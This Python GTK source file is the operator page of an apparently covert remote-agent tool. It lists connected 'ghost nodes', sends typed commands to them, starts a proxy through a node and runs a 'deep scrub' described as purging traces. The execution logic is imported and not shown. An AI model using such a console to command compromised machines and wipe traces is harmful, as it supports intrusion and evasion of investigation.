"""
Shadow Nodes Page — Sovereign Ghost-Node Orchestration HUD.
Directly manages remote agents, signal routing, and tactical delegation.
"""

import gi
gi.require_version("Gtk", "3.0")
from gi.repository import Gtk, GLib, Pango
import threading
import time

from shadowcypher.ui.base_page import BasePage
from shadowcypher.core.ghost import ghost_orchestrator
from shadowcypher.core.bus import bus
from shadowcypher.core.logger import logger

class ShadowNodesPage(BasePage):
    def __init__(self):
        super().__init__("\U0001f47b SHADOW_NODE_ORCHESTRATOR")
        
        # 1. Metrics
        from shadowcypher.ui.components import DataPod
        self.pod_active = DataPod("GHOST_SWARM", "0", "cyan")
        self.pod_signal = DataPod("SIGNAL_STEALTH", "100%", "green")
        self.pod_fluidity = DataPod("SOVEREIGN_FLUIDITY", "ULTIMATE", "amber")
        
        for pod in [self.pod_active, self.pod_signal, self.pod_fluidity]:
            self.metric_strip.pack_start(pod, True, True, 0)

        # 2. Node Grid
        frm = Gtk.Frame(label="GHOST_NODE_SWARM")
        self.node_store = Gtk.ListStore(str, str, str, str, str) # Nick, FP, OS, Host, Status
        self.tree = Gtk.TreeView(model=self.node_store)
        self.tree.get_style_context().add_class("node-list")
        
        for i, t in enumerate(["OPERATOR", "FINGERPRINT", "PLATFORM", "SIGNAL_ORIGIN", "STATUS"]):
            col = Gtk.TreeViewColumn(t, Gtk.CellRendererText(), text=i)
            col.set_resizable(True)
            self.tree.append_column(col)
            
        sw = Gtk.ScrolledWindow()
        sw.set_min_content_height(250)
        sw.add(self.tree)
        
        self.workspace.pack_start(frm, True, True, 0)
        frm.add(sw)

        # 3. Tactical Console (Interactive)
        console_frame = Gtk.Frame(label="TACTICAL_CONSOLE_STREAM")
        console_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=5)
        
        self.console_view = Gtk.TextView()
        self.console_view.set_editable(False)
        self.console_view.set_cursor_visible(False)
        self.console_view.get_style_context().add_class("terminal-view")
        
        scroll = Gtk.ScrolledWindow()
        scroll.set_policy(Gtk.PolicyType.NEVER, Gtk.PolicyType.AUTOMATIC)
        scroll.set_min_content_height(300)
        scroll.add(self.console_view)
        console_box.pack_start(scroll, True, True, 0)
        
        # Command Entry
        self.cmd_entry = Gtk.Entry()
        self.cmd_entry.set_placeholder_text("ENTER_TACTICAL_COMMAND...")
        self.cmd_entry.connect("activate", self._on_execute)
        console_box.pack_start(self.cmd_entry, False, False, 0)
        
        console_frame.add(console_box)
        self.workspace.pack_start(console_frame, True, True, 0)

        # Control Plane
        ctrl_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
        
        exec_btn = Gtk.Button(label="\u26a1 Execute")
        exec_btn.get_style_context().add_class("suggested-action")
        exec_btn.connect("clicked", self._on_execute)
        ctrl_box.pack_start(exec_btn, False, False, 0)

        proxy_btn = Gtk.Button(label="\U0001f510 Start Proxy")
        proxy_btn.get_style_context().add_class("suggested-action")
        proxy_btn.connect("clicked", self._on_start_proxy)
        ctrl_box.pack_start(proxy_btn, False, False, 0)
        
        scrub_btn = Gtk.Button(label="\U0001f9f9 Deep Scrub")
        scrub_btn.get_style_context().add_class("destructive-action")
        scrub_btn.connect("clicked", self._on_deep_scrub)
        ctrl_box.pack_start(scrub_btn, False, False, 0)
        
        self.workspace.pack_start(ctrl_box, False, False, 0)

        # Subscribe to bus events
        bus.subscribe("ghost_node_linked", lambda _: GLib.idle_add(self._refresh_grid))
        bus.subscribe("ghost_node_output", self._on_ghost_output)
        
        GLib.timeout_add(5000, self._refresh_grid)
        self._refresh_grid()

    def log(self, msg, level="INFO"):
        buffer = self.console_view.get_buffer()
        iter = buffer.get_end_iter()
        timestamp = time.strftime("%H:%M:%S")
        buffer.insert(iter, f"[{timestamp}] [{level}] {msg}\n")
        
        # Auto-scroll to bottom
        mark = buffer.get_insert()
        self.console_view.scroll_to_mark(mark, 0.0, True, 0.0, 1.0)

    def _refresh_grid(self):
        if not self.get_mapped(): return True
        nodes = ghost_orchestrator.get_active_nodes()
        self.node_store.clear()
        for n in nodes:
            status = "CONNECTED" if (time.time() - n["last_seen"] < 60) else "STALE"
            self.node_store.append([
                n["nick"], 
                n["fp"][:12], 
                n["os"], 
                n["host"], 
                status
            ])
        self.pod_active.set_value(str(len(nodes)))
        return True

    def _on_execute(self, btn):
        selection = self.tree.get_selection()
        model, treeiter = selection.get_selected()
        if treeiter is None:
            self.log("ERROR: No Shadow Node selected.", "ERROR")
            return
            
        cmd = self.cmd_entry.get_text().strip()
        if not cmd: return
        
        fp_short = model[treeiter][1]
        # Find full FP
        full_fp = None
        for n in ghost_orchestrator.nodes.values():
            if n.fp.startswith(fp_short):
                full_fp = n.fp
                break
        
        if full_fp:
            self.log(f"DISPATCHING: '{cmd}' to {model[treeiter][0]}", "APEX")
            ghost_orchestrator.execute(full_fp, cmd)
            self.cmd_entry.set_text("")
        else:
            self.log("ERROR: Node fingerprint mismatch.", "ERROR")

    def _on_start_proxy(self, btn):
        selection = self.tree.get_selection()
        model, treeiter = selection.get_selected()
        if treeiter is None:
            self.log("ERROR: No Shadow Node selected.", "ERROR")
            return
            
        fp_short = model[treeiter][1]
        # Find full FP
        full_fp = None
        for n in ghost_orchestrator.nodes.values():
            if n.fp.startswith(fp_short):
                full_fp = n.fp
                break
        
        if full_fp:
            # Ephemeral port (could be randomized)
            port = 1080 
            self.log(f"IGNITING_PROXY: Node {model[treeiter][0]} on port {port}", "APEX")
            ghost_orchestrator.start_proxy(full_fp, port)
        else:
            self.log("ERROR: Node fingerprint mismatch.", "ERROR")

    def _on_deep_scrub(self, btn):
        selection = self.tree.get_selection()
        model, treeiter = selection.get_selected()
        if treeiter is None:
            self.log("ERROR: No Shadow Node selected.", "ERROR")
            return
            
        fp_short = model[treeiter][1]
        # Find full FP
        full_fp = None
        for n in ghost_orchestrator.nodes.values():
            if n.fp.startswith(fp_short):
                full_fp = n.fp
                break
        
        if full_fp:
            self.log(f"IGNITING_DEEP_SCRUB: Purging traces on {model[treeiter][0]}...", "APEX")
            ghost_orchestrator.deep_scrub(full_fp)
        else:
            self.log("ERROR: Node fingerprint mismatch.", "ERROR")

    def _on_ghost_output(self, data):
        nick = data.get("nick")
        output = data.get("output")
        GLib.idle_add(self.log, f"[{nick}] RECEIVED:\n{output}", "SUCCESS")
